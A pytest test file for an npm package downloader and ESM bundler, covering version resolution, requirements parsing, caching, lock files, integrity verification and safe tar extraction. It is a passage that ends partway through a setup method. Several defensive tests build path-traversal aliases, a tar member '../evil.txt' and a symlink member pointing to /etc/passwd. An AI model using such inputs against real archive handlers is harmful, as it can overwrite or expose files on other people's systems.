import base64
import hashlib
import io
import json
import logging
import os
import platform
import shutil
import sys
import tarfile
import tempfile
import time
import urllib.parse

import pytest

import gnr.app.esmbuilder as esmbuilder
from gnr.app.esmbuilder import (
    EsmBuilder,
    GnrInstanceEsmBundler,
    _ESBUILD_VERSION,
    _default_alias,
    _npm_url,
    _range_predicate,
    _safe_pkg_name,
    _satisfies,
    _semver_tuple,
    _validate_alias,
    NPM_REGISTRY,
)
from gnr.app.gnrapp import GnrApp
from common import BaseGnrAppTest
from core.common import BaseGnrTest


def _make_tarball(dest_path, files):
    """Build a real gzipped tar at dest_path; files={relpath: str|bytes}, each
    entry landing under a 'package/' prefix as real npm tarballs do."""
    with tarfile.open(dest_path, 'w:gz') as tf:
        for relpath, content in files.items():
            if isinstance(content, str):
                content = content.encode('utf-8')
            info = tarfile.TarInfo(name=f'package/{relpath}')
            info.size = len(content)
            tf.addfile(info, io.BytesIO(content))
    return dest_path


def _dist_for(tarball_path, use_integrity=True):
    """Compute real npm-style dist metadata (integrity or shasum) for a file,
    and point 'tarball' at it via a file:// URL so the real download code
    path runs against real bytes with no network or mocked I/O involved."""
    with open(tarball_path, 'rb') as f:
        data = f.read()
    dist = {'tarball': 'file://' + os.path.abspath(tarball_path)}
    if use_integrity:
        dist['integrity'] = 'sha512-' + base64.b64encode(hashlib.sha512(data).digest()).decode('ascii')
    else:
        dist['shasum'] = hashlib.sha1(data).hexdigest()
    return dist


def _write_fake_esbuild(path):
    """A stand-in for the real esbuild binary: copies the entry file's
    content to --outfile. Lets bundle() be tested end to end (real entry
    file generation, real subprocess invocation, real output files) without
    depending on a real esbuild build or network access."""
    script = (
        f'#!{sys.executable}\n'
        'import sys\n'
        'args = sys.argv[1:]\n'
        'entry = args[0]\n'
        'outfile = None\n'
        'for a in args[1:]:\n'
        "    if a.startswith('--outfile='):\n"
        "        outfile = a[len('--outfile='):]\n"
        "with open(entry) as f:\n"
        '    content = f.read()\n'
        "with open(outfile, 'w') as f:\n"
        '    f.write(content)\n'
    )
    with open(path, 'w') as f:
        f.write(script)
    os.chmod(path, 0o755)
    return path


class _FakeApp:
    """Minimal stand-in for GnrApp, exposing only what GnrInstanceEsmBundler
    reads: the package closure. The real closure walk is exercised against a
    real GnrApp in TestInstanceClosureCollection."""

    def __init__(self, package_dirs):
        self._package_dirs = package_dirs
        self.instanceName = 'test'
        self.instanceFolder = tempfile.mkdtemp()

    def package_closure(self):
        return {
            pkgid: {'pkgid': pkgid, 'folder': os.path.join(parent, pkgid)}
            for pkgid, parent in self._package_dirs.items()
        }


class _FakeRegistry:
    """A local stand-in for the npm registry, serving real tarballs.

    Answers the two endpoints EsmBuilder uses: '<name>' (the packument, with
    every published version and dist-tags) and '<name>/<version>' (one
    version's metadata, whose dist points at a real tarball via file://).
    Every requested URL is recorded in `calls`."""

    def __init__(self, work):
        self.work = work
        self.packages = {}  # name -> {version: meta}
        self.calls = []

    def publish(self, name, version, deps=None, peer_deps=None, license_text='MIT license text'):
        pkg_json = {'name': name, 'version': version, 'license': 'MIT'}
        if deps:
            pkg_json['dependencies'] = deps
        if peer_deps:
            pkg_json['peerDependencies'] = peer_deps
        files = {'package.json': json.dumps(pkg_json), 'index.js': 'export default 1;\n'}
        if license_text:
            files['LICENSE'] = license_text
        tgz = os.path.join(self.work, f'{_safe_pkg_name(name)}-{version}.tgz')
        _make_tarball(tgz, files)
        self.packages.setdefault(name, {})[version] = {'version': version, 'dist': _dist_for(tgz)}

    def __call__(self, url):
        self.calls.append(url)
        parts = url[len(NPM_REGISTRY) + 1:].split('/')
        name = urllib.parse.unquote(parts[0])
        versions = self.packages[name]
        if len(parts) == 1:
            latest = max(versions, key=_semver_tuple)
            return {'versions': {v: {} for v in versions}, 'dist-tags': {'latest': latest}}
        return versions[parts[1]]

    def packument_calls(self, name):
        return [c for c in self.calls if c == _npm_url(name)]


class TestNpmUrl(BaseGnrAppTest):
    def test_unscoped_no_version(self):
        assert _npm_url('react') == f'{NPM_REGISTRY}/react'

    def test_unscoped_with_version(self):
        assert _npm_url('react', '18.2.0') == f'{NPM_REGISTRY}/react/18.2.0'

    def test_scoped_no_version(self):
        url = _npm_url('@esbuild/linux-x64')
        assert url == f'{NPM_REGISTRY}/%40esbuild%2Flinux-x64'

    def test_scoped_with_version(self):
        url = _npm_url('@esbuild/linux-x64', 'latest')
        assert url == f'{NPM_REGISTRY}/%40esbuild%2Flinux-x64/latest'


class TestSafePkgName(BaseGnrAppTest):
    def test_unscoped(self):
        assert _safe_pkg_name('react') == 'react'

    def test_scoped(self):
        assert _safe_pkg_name('@esbuild/linux-x64') == 'esbuild__linux-x64'

    def test_double_at(self):
        assert _safe_pkg_name('@scope/pkg') == 'scope__pkg'


class TestSemverTuple(BaseGnrAppTest):
    def test_full_version(self):
        assert _semver_tuple('18.2.0') == (18, 2, 0)

    def test_version_with_prerelease(self):
        assert _semver_tuple('18.2.0-rc.3') == (18, 2, 0)

    def test_version_with_build_meta(self):
        assert _semver_tuple('18.2.0+build.1') == (18, 2, 0)

    def test_invalid_version(self):
        assert _semver_tuple('not-a-version') is None

    def test_empty_string(self):
        assert _semver_tuple('') is None


class TestParseSpec(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def test_unscoped_with_version(self):
        assert self.builder._parse_spec('react@18.2.0') == ('react', '18.2.0')

    def test_unscoped_no_version(self):
        assert self.builder._parse_spec('react') == ('react', 'latest')

    def test_scoped_with_version(self):
        assert self.builder._parse_spec('@scope/pkg@1.0.0') == ('@scope/pkg', '1.0.0')

    def test_scoped_no_version(self):
        assert self.builder._parse_spec('@scope/pkg') == ('@scope/pkg', 'latest')

    def test_scoped_latest_explicit(self):
        name, version = self.builder._parse_spec('@scope/pkg@latest')
        assert name == '@scope/pkg'
        assert version == 'latest'


class TestNeedsResolution(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def test_exact_version_no_resolution(self):
        assert self.builder._needs_resolution('18.2.0') is False

    def test_exact_with_prerelease_no_resolution(self):
        assert self.builder._needs_resolution('18.2.0-rc.0') is False

    def test_dist_tag_no_resolution(self):
        assert self.builder._needs_resolution('latest') is False
        assert self.builder._needs_resolution('next') is False
        assert self.builder._needs_resolution('beta') is False

    def test_caret_range_needs_resolution(self):
        assert self.builder._needs_resolution('^18.0.0') is True

    def test_tilde_range_needs_resolution(self):
        assert self.builder._needs_resolution('~18.2.0') is True

    def test_partial_major_needs_resolution(self):
        assert self.builder._needs_resolution('18') is True

    def test_gte_range_needs_resolution(self):
        assert self.builder._needs_resolution('>=18') is True


class TestParseRequirements(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def _write_req(self, content):
        f = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_alias_form(self):
        path = self._write_req('myreact=react@18.2.0\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('myreact', 'react@18.2.0')]

    def test_bare_package_no_version(self):
        path = self._write_req('react\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('react', 'react')]

    def test_bare_package_with_version(self):
        path = self._write_req('react@18.2.0\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('react', 'react@18.2.0')]

    def test_scoped_package(self):
        path = self._write_req('@scope/pkg@1.0.0\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('scope__pkg', '@scope/pkg@1.0.0')]

    def test_pip_style_double_equals(self):
        path = self._write_req('react==18.2.0\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('react', 'react@18.2.0')]

    def test_pip_style_scoped(self):
        path = self._write_req('@scope/pkg==1.0.0\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('scope__pkg', '@scope/pkg@1.0.0')]

    def test_comments_and_blanks_ignored(self):
        path = self._write_req('# comment\n\nreact@18.2.0\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('react', 'react@18.2.0')]

    def test_multiple_entries(self):
        path = self._write_req('react@18.2.0\nvue@3.0.0\n')
        result = self.builder.parse_requirements(path)
        os.unlink(path)
        assert result == [('react', 'react@18.2.0'), ('vue', 'vue@3.0.0')]


class TestCacheValid(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def test_missing_dir_is_invalid(self):
        assert self.builder._cache_valid('/nonexistent/path') is False

    def test_dir_without_package_json_is_invalid(self):
        with tempfile.TemporaryDirectory() as d:
            os.makedirs(os.path.join(d, 'package'))
            assert self.builder._cache_valid(d) is False

    def test_dir_with_package_json_is_valid(self):
        with tempfile.TemporaryDirectory() as d:
            pkg_dir = os.path.join(d, 'package')
            os.makedirs(pkg_dir)
            with open(os.path.join(pkg_dir, 'package.json'), 'w') as f:
                json.dump({'name': 'test', 'version': '1.0.0'}, f)
            assert self.builder._cache_valid(d) is True


class TestManifest(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def test_load_manifest_missing_returns_none(self):
        with tempfile.TemporaryDirectory() as d:
            assert self.builder._load_manifest(d) is None

    def test_save_and_load_manifest(self):
        with tempfile.TemporaryDirectory() as d:
            items = [('react', 'react@18.2.0'), ('vue', 'vue@3.0.0')]
            results = [
                ('react', 'react', '18.2.0', os.path.join(d, 'react.js')),
                ('vue', 'vue', '3.0.0', os.path.join(d, 'vue.js')),
            ]
            self.builder._save_manifest(d, items, results)
            manifest = self.builder._load_manifest(d)

        assert manifest is not None
        assert set(manifest.keys()) == {'react', 'vue'}
        assert manifest['react']['spec'] == 'react@18.2.0'
        assert manifest['react']['name'] == 'react'
        assert manifest['react']['version'] == '18.2.0'
        assert manifest['react']['file'] == 'react.js'

    def test_results_from_manifest(self):
        with tempfile.TemporaryDirectory() as d:
            items = [('react', 'react@18.2.0')]
            results_in = [('react', 'react', '18.2.0', os.path.join(d, 'react.js'))]
            self.builder._save_manifest(d, items, results_in)
            results_out = self.builder._results_from_manifest(items, d)

        assert len(results_out) == 1
        alias, name, version, out_file = results_out[0]
        assert alias == 'react'
        assert name == 'react'
        assert version == '18.2.0'
        assert out_file.endswith('react.js')


class TestIsUpToDate(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def _touch_required_outputs(self, d, results):
        open(os.path.join(d, 'gnr_ext_bundle.js'), 'w').close()
        open(os.path.join(d, 'dependencies.json'), 'w').close()
        open(os.path.join(d, 'THIRD-PARTY-LICENSES.txt'), 'w').close()
        for _, _, _, f in results:
            open(f, 'w').close()

    def _make_output_dir(self, items, results, create_files=True):
        d = tempfile.mkdtemp()
        self.builder._save_manifest(d, items, results)
        if create_files:
            self._touch_required_outputs(d, results)
        return d

    def test_up_to_date_when_manifest_and_files_match(self):
        items = [('react', 'react@18.2.0')]
        with tempfile.TemporaryDirectory() as d:
            results = [('react', 'react', '18.2.0', os.path.join(d, 'react.js'))]
            self._touch_required_outputs(d, results)
            self.builder._save_manifest(d, items, results)
            assert self.builder._is_up_to_date(items, d) is True

    def test_not_up_to_date_when_no_manifest(self):
        with tempfile.TemporaryDirectory() as d:
            assert self.builder._is_up_to_date([('react', 'react@18.2.0')], d) is False

    def test_not_up_to_date_when_spec_changed(self):
        items_old = [('react', 'react@17.0.0')]
        items_new = [('react', 'react@18.2.0')]
        with tempfile.TemporaryDirectory() as d:
            results = [('react', 'react', '17.0.0', os.path.join(d, 'react.js'))]
            self._touch_required_outputs(d, results)
            self.builder._save_manifest(d, items_old, results)
            assert self.builder._is_up_to_date(items_new, d) is False

    def test_not_up_to_date_when_bundle_file_missing(self):
        items = [('react', 'react@18.2.0')]
        with tempfile.TemporaryDirectory() as d:
            results = [('react', 'react', '18.2.0', os.path.join(d, 'react.js'))]
            open(os.path.join(d, 'react.js'), 'w').close()
            self.builder._save_manifest(d, items, results)
            # gnr_ext_bundle.js not created
            assert self.builder._is_up_to_date(items, d) is False

    def test_not_up_to_date_when_dependencies_file_missing(self):
        items = [('react', 'react@18.2.0')]
        with tempfile.TemporaryDirectory() as d:
            results = [('react', 'react', '18.2.0', os.path.join(d, 'react.js'))]
            open(os.path.join(d, 'gnr_ext_bundle.js'), 'w').close()
            open(os.path.join(d, 'THIRD-PARTY-LICENSES.txt'), 'w').close()
            open(os.path.join(d, 'react.js'), 'w').close()
            self.builder._save_manifest(d, items, results)
            # dependencies.json not created
            assert self.builder._is_up_to_date(items, d) is False

    def test_not_up_to_date_when_attribution_file_missing(self):
        items = [('react', 'react@18.2.0')]
        with tempfile.TemporaryDirectory() as d:
            results = [('react', 'react', '18.2.0', os.path.join(d, 'react.js'))]
            open(os.path.join(d, 'gnr_ext_bundle.js'), 'w').close()
            open(os.path.join(d, 'dependencies.json'), 'w').close()
            open(os.path.join(d, 'react.js'), 'w').close()
            self.builder._save_manifest(d, items, results)
            # THIRD-PARTY-LICENSES.txt not created
            assert self.builder._is_up_to_date(items, d) is False

    def test_not_up_to_date_when_alias_set_differs(self):
        items_old = [('react', 'react@18.2.0')]
        items_new = [('react', 'react@18.2.0'), ('vue', 'vue@3.0.0')]
        with tempfile.TemporaryDirectory() as d:
            results = [('react', 'react', '18.2.0', os.path.join(d, 'react.js'))]
            self._touch_required_outputs(d, results)
            self.builder._save_manifest(d, items_old, results)
            assert self.builder._is_up_to_date(items_new, d) is False


class TestResolveVersion(BaseGnrAppTest):
    """Tests for _resolve_version using a fake npm registry response."""

    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def _fake_meta(self, versions, dist_tags=None):
        return {
            'versions': {v: {} for v in versions},
            'dist-tags': dist_tags or {},
        }

    def test_resolves_dist_tag(self):
        meta = self._fake_meta(['18.2.0'], dist_tags={'latest': '18.2.0'})
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', 'latest') == '18.2.0'

    def test_resolves_major_only(self):
        versions = ['17.0.0', '17.0.2', '18.0.0', '18.2.0', '18.3.1']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '18') == '18.3.1'

    def test_resolves_caret_major(self):
        versions = ['17.0.0', '18.0.0', '18.2.0', '19.0.0']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '^18.0.0') == '18.2.0'

    def test_resolves_tilde_major_minor(self):
        versions = ['18.1.0', '18.2.0', '18.2.5', '18.3.0']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '~18.2.0') == '18.2.5'

    def test_skips_prerelease_versions(self):
        versions = ['18.2.0', '18.3.0-rc.1', '18.3.0-beta']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '18') == '18.2.0'

    def test_raises_when_no_match(self):
        meta = self._fake_meta(['17.0.0', '17.1.0'])
        self.builder._fetch_json = lambda url: meta
        with pytest.raises(RuntimeError, match='No stable version'):
            self.builder._resolve_version('react', '18')

    def test_caret_respects_floor_version(self):
        """^18.2.0 must not match 18.0.0, which is below the stated floor."""
        versions = ['18.0.0', '18.2.0', '18.2.5']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '^18.2.0') == '18.2.5'

    def test_caret_excludes_versions_below_floor(self):
        versions = ['18.0.0']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        with pytest.raises(RuntimeError, match='No stable version'):
            self.builder._resolve_version('react', '^18.2.0')

    def test_tilde_excludes_versions_below_floor(self):
        versions = ['18.2.0']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        with pytest.raises(RuntimeError, match='No stable version'):
            self.builder._resolve_version('react', '~18.2.5')

    def test_gte_matches_next_major(self):
        """>=18 must not be truncated to an equality check on major==18."""
        versions = ['18.0.0', '19.0.0', '20.1.0']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '>=18') == '20.1.0'

    def test_gt_excludes_exact_floor(self):
        versions = ['18.0.0']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        with pytest.raises(RuntimeError, match='No stable version'):
            self.builder._resolve_version('react', '>18.0.0')

    def test_lt_matches_below_ceiling(self):
        versions = ['17.0.0', '18.0.0']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '<18') == '17.0.0'

    def test_exact_operator_matches_only_that_version(self):
        versions = ['18.0.0', '18.0.1']
        meta = self._fake_meta(versions)
        self.builder._fetch_json = lambda url: meta
        assert self.builder._resolve_version('react', '=18.0.0') == '18.0.0'


class TestDefaultAliasAndValidation(BaseGnrAppTest):
    def test_default_alias_folds_hyphens(self):
        assert _default_alias('react-dom') == 'react_dom'

    def test_default_alias_scoped_with_hyphens(self):
        assert _default_alias('@scope/pkg-name') == 'scope__pkg_name'

    def test_default_alias_leading_digit_gets_prefixed(self):
        assert _default_alias('123pkg') == '_123pkg'

    def test_validate_alias_accepts_identifier(self):
        _validate_alias('myAlias_1')

    def test_validate_alias_rejects_non_identifier(self):
        with pytest.raises(ValueError, match='Invalid alias'):
            _validate_alias('not-an-identifier')

    def test_validate_alias_rejects_path_traversal(self):
        with pytest.raises(ValueError, match='Invalid alias'):
            _validate_alias('../../etc/evil')

    def test_validate_alias_rejects_quote(self):
        with pytest.raises(ValueError, match='Invalid alias'):
            _validate_alias("a'b")

    def test_validate_alias_rejects_reserved_name(self):
        with pytest.raises(ValueError, match='reserved'):
            _validate_alias('gnr_ext_bundle')


class TestParseRequirementsValidation(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def _write_req(self, content):
        f = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_hyphenated_package_gets_underscored_alias(self):
        path = self._write_req('react-dom@18.2.0\n')
        try:
            result = self.builder.parse_requirements(path)
        finally:
            os.unlink(path)
        assert result == [('react_dom', 'react-dom@18.2.0')]

    def test_explicit_alias_with_path_traversal_rejected(self):
        path = self._write_req('../../evil=react@18.2.0\n')
        try:
            with pytest.raises(ValueError, match='Invalid alias'):
                self.builder.parse_requirements(path)
        finally:
            os.unlink(path)

    def test_explicit_alias_reserved_name_rejected(self):
        path = self._write_req('gnr_ext_bundle=react@18.2.0\n')
        try:
            with pytest.raises(ValueError, match='reserved'):
                self.builder.parse_requirements(path)
        finally:
            os.unlink(path)

    def test_explicit_alias_with_quote_rejected(self):
        path = self._write_req("a'b=react@18.2.0\n")
        try:
            with pytest.raises(ValueError, match='Invalid alias'):
                self.builder.parse_requirements(path)
        finally:
            os.unlink(path)


class TestExtractAllSafety(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def _open_tar_with_member(self, add_member):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode='w:gz') as tf:
            good = tarfile.TarInfo(name='package/package.json')
            data = b'{}'
            good.size = len(data)
            tf.addfile(good, io.BytesIO(data))
            add_member(tf)
        buf.seek(0)
        return tarfile.open(fileobj=buf, mode='r:gz')

    def test_rejects_path_traversal_member(self):
        def add(tf):
            evil = tarfile.TarInfo(name='../evil.txt')
            data = b'pwned'
            evil.size = len(data)
            tf.addfile(evil, io.BytesIO(data))

        tf = self._open_tar_with_member(add)
        try:
            with tempfile.TemporaryDirectory() as dest:
                with pytest.raises(Exception):
                    self.builder._extractall(tf, dest)
        finally:
            tf.close()

    def test_rejects_symlink_member(self):
        def add(tf):
            link = tarfile.TarInfo(name='package/evil-link')
            link.type = tarfile.SYMTYPE
            link.linkname = '/etc/passwd'
            tf.addfile(link)

        tf = self._open_tar_with_member(add)
        try:
            with tempfile.TemporaryDirectory() as dest:
                with pytest.raises(Exception):
                    self.builder._extractall(tf, dest)
        finally:
            tf.close()

    # These exercise _extractall_manual_filter directly rather than through
    # _extractall (which picks this path only when tarfile.data_filter is
    # truly absent, i.e. a genuinely old interpreter). Forcing that branch
    # selection by deleting tarfile.data_filter would also break Python
    # 3.14's own tarfile internals, which use that same module-level name
    # as their own implicit default filter.

    def test_fallback_filter_rejects_traversal_when_data_filter_unavailable(self):
        def add(tf):
            evil = tarfile.TarInfo(name='../evil.txt')
            data = b'pwned'
            evil.size = len(data)
            tf.addfile(evil, io.BytesIO(data))

        tf = self._open_tar_with_member(add)
        try:
            with tempfile.TemporaryDirectory() as dest:
                with pytest.raises(RuntimeError, match='outside destination'):
                    self.builder._extractall_manual_filter(tf, dest)
        finally:
            tf.close()

    def test_fallback_filter_rejects_symlink_when_data_filter_unavailable(self):
        def add(tf):
            link = tarfile.TarInfo(name='package/evil-link')
            link.type = tarfile.SYMTYPE
            link.linkname = '/etc/passwd'
            tf.addfile(link)

        tf = self._open_tar_with_member(add)
        try:
            with tempfile.TemporaryDirectory() as dest:
                with pytest.raises(RuntimeError, match='link member'):
                    self.builder._extractall_manual_filter(tf, dest)
        finally:
            tf.close()

    def test_fallback_filter_extracts_safe_members(self):
        tf = self._open_tar_with_member(lambda tf: None)
        try:
            with tempfile.TemporaryDirectory() as dest:
                self.builder._extractall_manual_filter(tf, dest)
                assert os.path.isfile(os.path.join(dest, 'package', 'package.json'))
        finally:
            tf.close()


class TestDownloadPackage(BaseGnrAppTest):
    def setup_method(self):
        self.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())
        self.work = tempfile.mkdtemp()

    def _pkg_tarball(self, name='leftpad', version='1.0.0', extra_files=None):
        files = {'package.json': json.dumps({'name': name, 'version': version, 'license': 'MIT'})}
        if extra_files:
            files.update(extra_files)
        path = os.path.join(self.work, f'{_safe_pkg_name(name)}-{version}.tgz')
        return _make_tarball(path, files)

    def test_downloads_and_extracts_real_tarball(self):
        tgz = self._pkg_tarball(extra_files={'LICENSE': 'MIT License text'})
        dist = _dist_for(tgz)
        self.builder._fetch_json = lambda url: {'version': '1.0.0', 'dist': dist}

        pkg_dir, name, version = self.builder.download_package('leftpad@1.0.0')

        assert name == 'leftpad'
        assert version == '1.0.0'
        with open(os.path.join(pkg_dir, 'package', 'package.json')) as f:
            assert json.load(f)['name'] == 'leftpad'
        with open(os.path.join(pkg_dir, 'package', 'LICENSE')) as f:
            assert f.read() == 'MIT License text'

    def test_cache_hit_skips_network(self):
        tgz = self._pkg_tarball()
        dist = _dist_for(tgz)
        calls = []

        def fetch(url):
            calls.append(url)
            return {'version': '1.0.0', 'dist': dist}

        self.builder._fetch_json = fetch

        self.builder.download_package('leftpad@1.0.0')
        assert len(calls) == 1
        self.builder.download_package('leftpad@1.0.0')
        assert len(calls) == 1  # second call served entirely from the disk cache

    def test_integrity_mismatch_raises_and_uses_sha512(self):
        tgz = self._pkg_tarball()
        dist = _dist_for(tgz)
        dist['integrity'] = 'sha512-' + base64.b64encode(b'x' * 64).decode('ascii')
        self.builder._fetch_json = lambda url: {'version': '1.0.0', 'dist': dist}

        with pytest.raises(RuntimeError, match='Integrity check failed'):
            self.builder.download_package('leftpad@1.0.0')

    def test_missing_integrity_metadata_raises(self):
        tgz = self._pkg_tarball()
        dist = {'tarball': 'file://' + os.path.abspath(tgz)}
        self.builder._fetch_json = lambda url: {'version': '1.0.0', 'dist': dist}

        with pytest.raises(RuntimeError, match='No integrity metadata'):
            self.builder.download_package('leftpad@1.0.0')

    def test_shasum_fallback_verifies(self):
        tgz = self._pkg_tarball()
        dist = _dist_for(tgz, use_integrity=False)
        self.builder._fetch_json = lambda url: {'version': '1.0.0', 'dist': dist}

        pkg_dir, name, version = self.builder.download_package('leftpad@1.0.0')
        assert name == 'leftpad'

    def test_wrong_shasum_raises(self):
        tgz = self._pkg_tarball()
        dist = _dist_for(tgz, use_integrity=False)
        dist['shasum'] = '0' * 40
        self.builder._fetch_json = lambda url: {'version': '1.0.0', 'dist': dist}

        with pytest.raises(RuntimeError, match='Integrity check failed'):
            self.builder.download_package('leftpad@1.0.0')


class TestGetEsbuild(BaseGnrAppTest):
    def setup_method(self):
        self.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())
        self.work = tempfile.mkdtemp()

    def test_downloads_verifies_and_caches(self, monkeypatch):
        monkeypatch.setattr(platform, 'system', lambda: 'Linux')
        monkeypatch.setattr(platform, 'machine', lambda: 'x86_64')

        tgz = os.path.join(self.work, 'esbuild-linux-x64.tgz')
        _make_tarball(tgz, {'bin/esbuild': '#!/bin/sh\necho fake-esbuild\n'})
        dist = _dist_for(tgz)
        calls = []

        def fetch(url):
            calls.append(url)
            return {'dist': dist}

        self.builder._fetch_json = fetch

        path = self.builder.get_esbuild()

        assert os.path.isfile(path)
        assert os.access(path, os.X_OK)
        with open(path) as f:
            assert 'fake-esbuild' in f.read()
        assert len(calls) == 1

        # A second call must be served from the on-disk cache: no network at all.
        self.builder._esbuild = None
        path2 = self.builder.get_esbuild()
        assert path2 == path
        assert len(calls) == 1

    def test_unsupported_platform_raises(self, monkeypatch):
        monkeypatch.setattr(platform, 'system', lambda: 'plan9')
        monkeypatch.setattr(platform, 'machine', lambda: 'mystery')
        with pytest.raises(RuntimeError, match='not available for platform'):
            self.builder.get_esbuild()

    def test_integrity_mismatch_raises(self, monkeypatch):
        monkeypatch.setattr(platform, 'system', lambda: 'Linux')
        monkeypatch.setattr(platform, 'machine', lambda: 'x86_64')
        tgz = os.path.join(self.work, 'esbuild-linux-x64.tgz')
        _make_tarball(tgz, {'bin/esbuild': 'binary-content'})
        dist = _dist_for(tgz)
        dist['integrity'] = 'sha512-' + base64.b64encode(b'y' * 64).decode('ascii')
        self.builder._fetch_json = lambda url: {'dist': dist}

        with pytest.raises(RuntimeError, match='Integrity check failed'):
            self.builder.get_esbuild()


class TestSymlinkPackage(BaseGnrAppTest):
    def setup_method(self):
        self.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())
        self.work = tempfile.mkdtemp()

    def test_creates_symlink_for_unscoped_package(self):
        pkg_dir = os.path.join(self.work, 'pkg')
        os.makedirs(os.path.join(pkg_dir, 'package'))
        node_modules = os.path.join(self.work, 'node_modules')
        os.makedirs(node_modules)

        self.builder._symlink_package(node_modules, pkg_dir, 'react')

        link = os.path.join(node_modules, 'react')
        assert os.path.islink(link)
        assert os.path.realpath(link) == os.path.realpath(os.path.join(pkg_dir, 'package'))

    def test_creates_nested_symlink_for_scoped_package(self):
        pkg_dir = os.path.join(self.work, 'pkg')
        os.makedirs(os.path.join(pkg_dir, 'package'))
        node_modules = os.path.join(self.work, 'node_modules')
        os.makedirs(node_modules)

        self.builder._symlink_package(node_modules, pkg_dir, '@scope/pkg')

        link = os.path.join(node_modules, '@scope', 'pkg')
        assert os.path.islink(link)

    def test_idempotent_when_already_linked(self):
        pkg_dir = os.path.join(self.work, 'pkg')
        os.makedirs(os.path.join(pkg_dir, 'package'))
        node_modules = os.path.join(self.work, 'node_modules')
        os.makedirs(node_modules)

        self.builder._symlink_package(node_modules, pkg_dir, 'react')
        self.builder._symlink_package(node_modules, pkg_dir, 'react')  # must not raise

        link = os.path.join(node_modules, 'react')
        assert os.path.islink(link)


class TestLockFile(BaseGnrAppTest):
    @classmethod
    def setup_class(cls):
        super().setup_class()
        cls.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())

    def test_load_missing_returns_none(self):
        assert self.builder.load_lock('/nonexistent/esm_requirements.lock') is None

    def test_save_and_load_round_trip(self):
        with tempfile.TemporaryDirectory() as d:
            lock_path = os.path.join(d, 'esm_requirements.lock')
            items = [('react', 'react', 'react@^18.0.0', '18.2.0')]
            deps = {'react': '18.2.0', 'loose-envify': '1.4.0'}
            self.builder.save_lock(lock_path, items, deps)
            lock = self.builder.load_lock(lock_path)
            assert lock['aliases']['react'] == {
                'spec': 'react@^18.0.0', 'name': 'react', 'version': '18.2.0',
            }
            assert lock['dependencies'] == deps

    def test_save_is_noop_when_unchanged(self):
        with tempfile.TemporaryDirectory() as d:
            lock_path = os.path.join(d, 'esm_requirements.lock')
            items = [('react', 'react', 'react@^18.0.0', '18.2.0')]
            deps = {'react': '18.2.0'}
            self.builder.save_lock(lock_path, items, deps)
            mtime1 = os.path.getmtime(lock_path)
            time.sleep(0.01)
            self.builder.save_lock(lock_path, items, deps)
            mtime2 = os.path.getmtime(lock_path)
            assert mtime1 == mtime2

    def test_save_rewrites_when_changed(self):
        with tempfile.TemporaryDirectory() as d:
            lock_path = os.path.join(d, 'esm_requirements.lock')
            items = [('react', 'react', 'react@^18.0.0', '18.2.0')]
            self.builder.save_lock(lock_path, items, {'react': '18.2.0'})
            items2 = [('react', 'react', 'react@^18.0.0', '18.3.0')]
            self.builder.save_lock(lock_path, items2, {'react': '18.3.0'})
            lock = self.builder.load_lock(lock_path)
            assert lock['aliases']['react']['version'] == '18.3.0'


class TestBundleEndToEnd(BaseGnrAppTest):
    def setup_method(self):
        self.builder = EsmBuilder(cache_dir=tempfile.mkdtemp())
        self.work = tempfile.mkdtemp()
        self.output_dir = tempfile.mkdtemp()
        self.builder.get_esbuild = lambda: _write_fake_esbuild(
            os.path.join(self.work, 'fake-esbuild')
        )

